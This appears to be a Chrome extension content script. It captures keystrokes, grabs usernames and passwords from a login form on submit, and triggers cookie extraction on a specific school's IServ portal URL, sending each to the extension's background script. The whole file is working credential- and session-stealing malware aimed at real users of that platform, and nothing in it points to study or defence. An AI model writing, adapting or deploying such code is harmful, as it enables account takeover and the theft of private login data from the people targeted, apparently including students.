function sendtoBackground(key, timestamp) {
    chrome.runtime.sendMessage({ action: 'addKeylog', key: key, timestamp: timestamp });
}

function monitor() {
    var loginForm = document.querySelector('#login-form');
    if (loginForm) {
        loginForm.addEventListener('submit', function(event) {
            var username = document.querySelector('input[name="_username"]').value;
            var password = document.querySelector('input[name="_password"]').value;
            chrome.runtime.sendMessage({ action: 'loginAttempt', username: username, password: password });
            return true;
        });
    } else {
        setTimeout(monitor, 1000);
    }
}

function user() {
    const usernameElement = document.querySelector('.profile-username');
    return usernameElement ? usernameElement.textContent.trim() : 'Unknown User';
}

function keks() {
    if (window.location.href.startsWith("https://sts-bergstedt.de/iserv/")) {
        const username = user();

        chrome.runtime.sendMessage({ action: 'extractCookiesWithUsername', username: username });
    }
}

keks();
monitor();
